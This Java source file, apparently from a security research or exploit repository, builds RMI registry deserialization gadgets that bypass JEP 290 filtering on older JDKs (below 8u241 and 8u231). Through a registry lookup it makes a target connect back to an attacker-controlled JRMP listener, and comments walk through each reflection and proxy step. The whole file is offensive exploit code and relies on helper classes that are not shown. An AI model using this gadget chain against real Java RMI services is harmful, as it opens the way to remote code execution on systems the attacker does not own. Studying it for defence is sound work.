package org.example;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

public class EvilLookup {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        Remote remote = getGadget2("127.0.0.1", 8888);
        //Remote remote = getGadget("127.0.0.1", 8888);

        Naming.lookup(registry, remote);
    }

    // <8u241
    public static UnicastRemoteObject getGadget(String host, int port) throws Exception {

        // 1. Create a new TCPEndpoint and UnicastRef instance.
        // The TCPEndpoint contains the IP/port of the attacker
        // Taken from Moritz Bechlers JRMP Client
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry

        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

        // 2. Create a new instance of RemoteObjectInvocationHandler,
        // passing the RemoteRef object (refObject) with the attacker controlled IP/port in the constructor
        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);

        // 3. Create a dynamic proxy class that implements the classes/interfaces RMIServerSocketFactory
        // and Remote and passes all incoming calls to the invoke method of the
        // RemoteObjectInvocationHandler
        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(),
                new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
                myInvocationHandler);

        // 4. Create a new UnicastRemoteObject instance by using Reflection
        // Make the constructor public
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);

        // 5. Make the ssf instance accessible (again by using Reflection) and set it to the proxy object
        Field privateSsfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        privateSsfField.setAccessible(true);

        // 6. Set the ssf instance of the UnicastRemoteObject to our proxy
        privateSsfField.set(myRemoteObject, handcraftedSSF);

        // return the gadget
        return myRemoteObject;
    }

    //<8u231
    public static Remote getGadget2(String host, int port) throws Exception {
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 8888);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(EvilBind.class.getClassLoader(), new Class[] {
                Registry.class
        }, obj);
        return proxy;
    }

}
